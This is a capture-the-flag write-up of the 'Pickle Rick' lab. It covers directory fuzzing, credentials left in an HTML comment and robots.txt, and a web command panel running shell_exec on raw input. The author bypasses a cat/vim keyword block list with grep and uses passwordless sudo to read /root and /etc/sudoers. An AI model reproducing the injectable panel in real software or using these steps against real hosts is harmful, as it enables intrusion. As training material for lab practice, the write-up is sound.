# Pickle Rick

### [Reconnaisance]

- Firstly, i use ffuf to fuzz the ip that was given when we start machine

```
**┌──(kali㉿kali)-[~/wordlists]
└─$ ffuf -u http://10.10.231.188/FUZZ -w common.txt            
...........
.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 237ms]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 237ms]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 256ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 240ms]
index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 241ms]
login.php               [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 227ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 231ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 244ms]
:: Progress: [4687/4687] :: Job [1/1] :: 171 req/sec :: Duration: [0:00:28] :: Errors: 0 ::**
                                                                                                    
```

 ⇒ We can see that there are 2 interesting paths which are login.php and robots.txt

### [Exploit]

- On the default page, we can see the username

```
<!--
Note to self, remember username!
Username: R1ckRul3s
-->
```

- Access robots.txt, we can see the weird string: *Wubbalubbadubdub*
- Now move login.php, i think that the weird string is password and it is true
- After logining successfully, we can see the command panel.

+) Use ‘ls’ to see more clearly

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

+) There are some file text which can be the ingredients. However, when i try to cat the file, it doesn’t work.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/0051f2f0-1646-4504-bd84-e934e510268c/6d02494c-9b83-466e-8a65-431f3def1f28/Untitled.png)

 +)  pwd show that we are in **/var/www/html** and whoami shows that we are user **www-data**

[?] How can we see the data in the file ?

- Remmember that we are in /var/www/html and robots.txt is displayed for us when we access the file on url, so we can do the same way with other 2 files.txt
- http://10.10.231.188/Sup3rS3cretPickl3Ingred.txt shows  **mr. meeseek hair** which is the first ingredient

=> Question 1:  **mr. meeseek hair**

- http://10.10.231.188/clue.txt hints that **Look around the file system for the other ingredient.**

[Hint] The command `grep` can be used in this case to work the same as `cat` command to get the content of the file

- We get the content of file portal.php to know how the backend works

`grep . portal.php`

```

........
    <?php
      function contains($str, array $arr)
      {
          foreach($arr as $a) {
              if (stripos($str,$a) !== false) return true;
          }
          return false;
      }
      // Can't use any command in the array
      $cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
      if(isset($_POST["command"])) {
        if(contains($_POST["command"], $cmds)) {
          echo "</br><p><u>Command disabled</u> to make it hard for future <b>PICKLEEEE RICCCKKKK</b>.</p><img src='assets/fail.gif'>";
        } else {
          $output = shell_exec($_POST["command"]);
          echo "</br><pre>$output</pre>";
        }
      }
    ?>
    //[?] base64 encoded. However, i decode so many time and get the str 'rabbit hole'
    <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```

- Next, we try to list the file in /home to check if there is any user

ls /home

```
rick => this user sound sus right 
ubuntu
```

ls /home/rick

```
second ingredients => the second flag
```

grep . /home/rick/"second ingredients”

```
1 jerry tear
```

[?] Why do we need “” here ? Because it works like this

```
┌──(kali㉿kali)-[~/wordlists]
└─$ touch test file
                                                                                                                                                               
┌──(kali㉿kali)-[~/wordlists]
└─$ ls
common.txt  file  parameters.txt  subdomains.txt  test
                                                                                                                                                               
┌──(kali㉿kali)-[~/wordlists]
└─$ touch "test file"
                                                                                                                                                               
┌──(kali㉿kali)-[~/wordlists]
└─$ ls
 common.txt   file   parameters.txt   subdomains.txt   test  'test file'
                                                                                                                                                                                                                                                                                                       
┌──(kali㉿kali)-[~/wordlists]
└─$ nano 'test file'
                                                                                                                                                               
┌──(kali㉿kali)-[~/wordlists]
└─$ cat 'test file'
asdasd
```

⇒ Questtion 2: **1 jerry tear**

- Next, i try list the file and dir in “/”

ls / 

```
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
```

- /root looks suspicous right ? However, when i try to cd and list all dir in the file, it doesn’t show anything.

[Explaination]

In Linux systems, the **`/root`** directory is the home directory of the root user, the system administrator. By default, only the root user or users with sudo privileges can access this directory.

sudo ls /root

```
3rd.txt
snap
```

sudo grep . /root/3rd.txt

```
3rd ingredients: fleeb juice
=> Question 3: fleeb juice
```

[?] When we sudo to get the full privileges, we need the password of superuser because we are user www-data right !

```
sudo grep . /etc/sudoers
......
root	ALL=(ALL:ALL) ALL
//[!] www-data can execute all command without pw
www-data                ALL=(ALL) NOPASSWD: ALL 
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL
# See sudoers(5) for more information on "#include" directives:
#includedir /etc/sudoers.d
```
